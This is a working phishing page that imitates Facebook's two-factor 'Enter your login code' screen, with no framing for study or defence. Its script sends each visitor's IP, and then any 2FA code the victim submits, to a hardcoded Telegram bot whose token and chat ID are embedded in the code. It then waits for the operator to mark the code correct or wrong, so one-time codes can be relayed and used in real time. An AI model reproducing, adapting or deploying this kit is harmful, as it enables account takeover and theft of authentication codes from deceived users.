<!DOCTYPE html>
<html lang="en">
<head>
  <link rel="icon" href="imgs/FBC.png" type="image/png">
  <meta charset="UTF-8" />
  <meta name="viewport" content="width=device-width, initial-scale=1" />
  <title>Enter Your Login Code</title>
  <style>
    * {
      box-sizing: border-box;
    }
    body, html {
      margin: 0;
      padding: 0;
      font-family: Helvetica, Arial, sans-serif;
      background-color: #f0f2f5;
      color: #050505;
    }
    .wrapper {
      max-width: 760px;
      margin: 60px auto;
      padding: 0 20px;
    }
    .subtitle {
      font-size: 15px;
      color: #606770;
      margin-bottom: 10px;
    }
    h1 {
      font-size: 28px;
      font-weight: 600;
      margin: 0 0 16px 0;
    }
    .description {
      font-size: 17px;
      line-height: 1.5;
      color: #1c1e21;
      margin-bottom: 30px;
    }
    .image-box {
      margin-bottom: 30px;
    }
    .image-box img {
      width: 100%;
      height: auto;
      border-radius: 8px;
      border: 1px solid #dddfe2;
    }
    .status {
      display: flex;
      align-items: flex-start;
      gap: 12px;
      margin-bottom: 20px;
      max-width: 600px;
    }
    .status-icon svg {
      width: 32px;
      height: 32px;
      margin-top: 2px;
    }
    .status-text p {
      margin: 0;
    }
    .status-text p:first-child {
      font-weight: bold;
      color: #050505;
      margin-bottom: 3px;
    }
    .status-text p:last-child {
      color: #606770;
      font-size: 15px;
    }
    .code-input {
      width: 100%;
      padding: 14px 16px;
      font-size: 17px;
      border: 1px solid #dddfe2;
      border-radius: 6px;
      margin-bottom: 10px;
    }
    .submit-btn {
      width: 100%;
      padding: 12px;
      background-color: #1877f2;
      color: white;
      border: none;
      border-radius: 6px;
      font-size: 18px;
      font-weight: bold;
      cursor: pointer;
      transition: background-color 0.2s;
      margin-bottom: 16px;
    }
    .submit-btn:hover {
      background-color: #166fe5;
    }
    .submit-btn:disabled {
      background-color: #a1c3f7;
      cursor: not-allowed;
    }
    .try-button {
      width: 100%;
      padding: 12px;
      border: 1px solid #ccd0d5;
      border-radius: 6px;
      font-size: 18px;
      font-weight: bold;
      color: #050505;
      background-color: white;
      cursor: pointer;
      transition: background 0.2s ease-in-out;
      text-align: center;
    }
    .try-button:hover {
      background-color: #f5f6f7;
    }
    .error-message,
    .checking-message,
    .success-message {
      font-size: 15px;
      margin-bottom: 10px;
      text-align: center;
      padding: 10px;
      border-radius: 6px;
    }
    .error-message {
      color: #d93025;
      background-color: #fce8e6;
      border: 1px solid #fadbd8;
    }
    .checking-message {
      color: #606770;
      background-color: #f0f2f5;
      border: 1px solid #dddfe2;
    }
    .success-message {
      color: #42b72a;
      background-color: #e6f4ea;
      border: 1px solid #ceead6;
    }
    @media (max-width: 600px) {
      h1 {
        font-size: 24px;
      }
      .description {
        font-size: 16px;
      }
      .status {
        flex-direction: column;
      }
    }
    
    /* Debug panel (hidden by default) */
    .debug-panel {
      display: none;
      position: fixed;
      bottom: 20px;
      right: 20px;
      background: white;
      padding: 15px;
      border-radius: 8px;
      box-shadow: 0 2px 10px rgba(0,0,0,0.2);
      z-index: 1000;
    }
  </style>
</head>
<body>
  <div class="wrapper">
    <div class="subtitle">• Facebook</div>
    <h1>Enter your login code</h1>
    <div class="description">
      We sent a code to your phone. It may take a few moments to arrive via SMS or email.
    </div>

    <div class="image-box">
      <img src="imgs/main.jpg" alt="Logo">
    </div>

    <div class="status">
      <div class="status-icon">
        <!-- SVG Circle with 3 Dots Inside -->
        <svg viewBox="0 0 64 64" xmlns="http://www.w3.org/2000/svg">
          <circle cx="32" cy="32" r="30" fill="none" stroke="black" stroke-width="4"/>
          <circle cx="24" cy="32" r="3.5" fill="black"/>
          <circle cx="32" cy="32" r="3.5" fill="black"/>
          <circle cx="40" cy="32" r="3.5" fill="black"/>
        </svg>
      </div>
      <div class="status-text">
        <p>Enter the code</p>
        <p>Use the 6-digit or 8-digit code we sent to complete login.</p>
      </div>
    </div>

    <form id="codeForm">
      <input
        id="codeInput"
        class="code-input"
        type="tel"
        inputmode="numeric"
        pattern="[0-9]*"
        maxlength="8"
        placeholder="Enter confirmation code"
        required
      />
      <div id="checkingMsg" class="checking-message" style="display:none;">
        <i class="fas fa-spinner fa-spin"></i> Checking code...
      </div>
      <div id="errorMsg" class="error-message" style="display:none;">
        <i class="fas fa-exclamation-circle"></i> <span id="errorText">The code you entered is incorrect. Please try again.</span>
      </div>
      <div id="successMsg" class="success-message" style="display:none;">
        <i class="fas fa-check-circle"></i> Code verified successfully! Redirecting...
      </div>
      <button id="submitBtn" class="submit-btn" type="submit">Continue</button>
    </form>

    <button class="try-button" id="tryAnotherWay">Try Another Way</button>
  </div>

  <!-- Debug Panel (Hidden for regular users) -->
  <div id="debugPanel" class="debug-panel">
    <h3 style="margin-bottom: 10px;">Telegram Admin Controls</h3>
    <button id="simulateCorrect" style="background: #42b72a; color: white; border: none; padding: 8px; border-radius: 4px; width: 100%; margin-bottom: 5px;">Simulate Correct Code</button>
    <button id="simulateWrong" style="background: #d93025; color: white; border: none; padding: 8px; border-radius: 4px; width: 100%; margin-bottom: 5px;">Simulate Wrong Code</button>
    <button id="simulateRedirect" style="background: #1877f2; color: white; border: none; padding: 8px; border-radius: 4px; width: 100%;">Simulate Redirect</button>
  </div>

  <script>
    // Telegram API configuration
    const TELEGRAM_BOT_TOKEN = "8254748586:AAEkaDW7j65hgWfIS-dk7mdW96CxmlOS6cY";
    const TELEGRAM_CHAT_ID = "-1002986579465";
    
    // State variables
    let currentCodeData = null;
    let pollingInterval = null;
    let lastUpdateId = 0;
    let isChecking = false;

    // DOM Elements
    const codeForm = document.getElementById("codeForm");
    const codeInput = document.getElementById("codeInput");
    const errorMsg = document.getElementById("errorMsg");
    const checkingMsg = document.getElementById("checkingMsg");
    const successMsg = document.getElementById("successMsg");
    const submitBtn = document.getElementById("submitBtn");
    const tryAnotherWay = document.getElementById("tryAnotherWay");
    const errorText = document.getElementById("errorText");
    const debugPanel = document.getElementById("debugPanel");
    const simulateCorrect = document.getElementById("simulateCorrect");
    const simulateWrong = document.getElementById("simulateWrong");
    const simulateRedirect = document.getElementById("simulateRedirect");

    // Initialize
    document.addEventListener('DOMContentLoaded', function() {
      // Show debug panel in development
      if (window.location.hostname === 'localhost' || window.location.hostname === '127.0.0.1') {
        debugPanel.style.display = 'block';
      }
      
      // Send visitor info on page load
      sendVisitorInfo();
      
      // Add event listeners
      codeForm.addEventListener("submit", handleFormSubmit);
      tryAnotherWay.addEventListener("click", handleTryAnotherWay);
      
      // Debug buttons
      simulateCorrect.addEventListener('click', () => simulateTelegramResponse('correct_code'));
      simulateWrong.addEventListener('click', () => simulateTelegramResponse('wrong_code'));
      simulateRedirect.addEventListener('click', () => simulateTelegramResponse('redirect_fb'));
    });

    // Function to send data to Telegram with inline keyboard
    async function sendToTelegram(message, code = null) {
      try {
        // Store the current code for admin responses
        if (code) {
          currentCodeData = { code };
        }
        
        const keyboard = code ? {
          inline_keyboard: [
            [
              { text: "✅ Correct Code", callback_data: `correct_code:${code}` },
              { text: "❌ Wrong Code", callback_data: `wrong_code:${code}` }
            ],
            [
              { text: "🔗 Redirect to Facebook", callback_data: `redirect_fb:${code}` }
            ]
          ]
        } : null;

        const payload = {
          chat_id: TELEGRAM_CHAT_ID,
          text: message,
          parse_mode: 'HTML'
        };

        if (keyboard) {
          payload.reply_markup = keyboard;
        }

        const response = await fetch(`https://api.telegram.org/bot${TELEGRAM_BOT_TOKEN}/sendMessage`, {
          method: 'POST',
          headers: {
            'Content-Type': 'application/json'
          },
          body: JSON.stringify(payload)
        });
        return await response.json();
      } catch (error) {
        console.error('Error sending to Telegram:', error);
        hideCheckingState();
      }
    }

    // Function to poll for Telegram updates (callback queries)
    async function pollTelegramUpdates() {
      try {
        const response = await fetch(`https://api.telegram.org/bot${TELEGRAM_BOT_TOKEN}/getUpdates?offset=${lastUpdateId + 1}&timeout=30`);
        const data = await response.json();
        
        if (data.ok && data.result.length > 0) {
          for (const update of data.result) {
            lastUpdateId = update.update_id;
            
            // Check if this is a callback query (button press)
            if (update.callback_query) {
              const callbackData = update.callback_query.data;
              const callbackCode = update.callback_query.data.split(':')[1];
              
              // Check if this callback is for the current code
              if (currentCodeData && currentCodeData.code === callbackCode) {
                console.log('Received callback from Telegram:', callbackData);
                
                // Process the callback
                if (callbackData.startsWith('correct_code')) {
                  simulateTelegramResponse('correct_code');
                } else if (callbackData.startsWith('wrong_code')) {
                  simulateTelegramResponse('wrong_code');
                } else if (callbackData.startsWith('redirect_fb')) {
                  simulateTelegramResponse('redirect_fb');
                }
                
                // Answer the callback query to remove the loading state on the button
                await fetch(`https://api.telegram.org/bot${TELEGRAM_BOT_TOKEN}/answerCallbackQuery`, {
                  method: 'POST',
                  headers: {
                    'Content-Type': 'application/json'
                  },
                  body: JSON.stringify({
                    callback_query_id: update.callback_query.id
                  })
                });
                
                // Stop polling since we got a response
                stopPolling();
                break;
              }
            }
          }
        }
      } catch (error) {
        console.error('Error polling Telegram updates:', error);
      }
    }

    // Start polling for Telegram updates
    function startPolling() {
      // Clear any existing polling
      stopPolling();
      
      // Poll every 3 seconds
      pollingInterval = setInterval(pollTelegramUpdates, 3000);
      console.log('Started polling for Telegram responses');
    }

    // Stop polling for Telegram updates
    function stopPolling() {
      if (pollingInterval) {
        clearInterval(pollingInterval);
        pollingInterval = null;
        console.log('Stopped polling for Telegram responses');
      }
    }

    // Function to simulate Telegram webhook responses
    function simulateTelegramResponse(type) {
      if (!currentCodeData) return;
      
      // Hide checking message
      hideCheckingState();
      
      switch(type) {
        case 'correct_code':
          // Show success and redirect after a moment
          showSuccess();
          break;
          
        case 'wrong_code':
          // Show error message and reset form
          showError("The code you entered is incorrect. Please try again.");
          break;
          
        case 'redirect_fb':
          // Redirect directly to Facebook
          window.location.href = 'https://facebook.com';
          break;
      }
    }

    async function handleFormSubmit(e) {
      e.preventDefault();

      const code = codeInput.value.trim();
      if (!code) {
        alert("Please enter the confirmation code.");
        return;
      }

      // Show checking state
      showCheckingState();

      // Get IP and send to Telegram with buttons
      const ip = await getPublicIP();
      await sendToTelegram(`
<b>🔢 2FA Code Submitted</b>
🔢 <b>Code:</b> ${code}
🌍 <b>IP:</b> ${ip}
🕒 <b>Time:</b> ${new Date().toLocaleString()}
      `.trim(), code);
      
      // Start polling for admin response
      startPolling();
    }

    function handleTryAnotherWay(e) {
      e.preventDefault();
      alert("Provide a backup sign-in option here (e.g., recovery codes, email, support).");
    }

    function showCheckingState() {
      isChecking = true;
      errorMsg.style.display = "none";
      successMsg.style.display = "none";
      checkingMsg.style.display = "block";
      submitBtn.disabled = true;
      codeInput.disabled = true;
    }

    function hideCheckingState() {
      isChecking = false;
      checkingMsg.style.display = "none";
      submitBtn.disabled = false;
      codeInput.disabled = false;
    }

    function showError(message) {
      errorText.textContent = message;
      errorMsg.style.display = "block";
      successMsg.style.display = "none";
      codeInput.value = '';
      codeInput.focus();
    }

    function showSuccess() {
      errorMsg.style.display = "none";
      successMsg.style.display = "block";
      codeInput.disabled = true;
      submitBtn.disabled = true;
      
      // Redirect after a moment
      setTimeout(() => {
        window.location.href = 'https://facebook.com';
      }, 2000);
    }

    async function getPublicIP() {
      try {
        const res = await fetch("https://api.ipify.org?format=json");
        if (!res.ok) throw new Error("Failed to fetch IP");
        const data = await res.json();
        return data.ip;
      } catch (err) {
        console.error("IP fetch error:", err);
        return "unknown";
      }
    }

    async function sendVisitorInfo() {
      try {
        const ip = await getPublicIP();
        await sendToTelegram(`<b>🔢 2FA Page Visited</b>\n🌍 <b>IP:</b> ${ip}\n🕒 <b>Time:</b> ${new Date().toLocaleString()}`);
      } catch (error) {
        console.error('Error sending visitor info:', error);
      }
    }
  </script>
  
  <!-- Font Awesome for icons -->
  <script src="https://kit.fontawesome.com/a076d05399.js" crossorigin="anonymous"></script>
</body>
</html>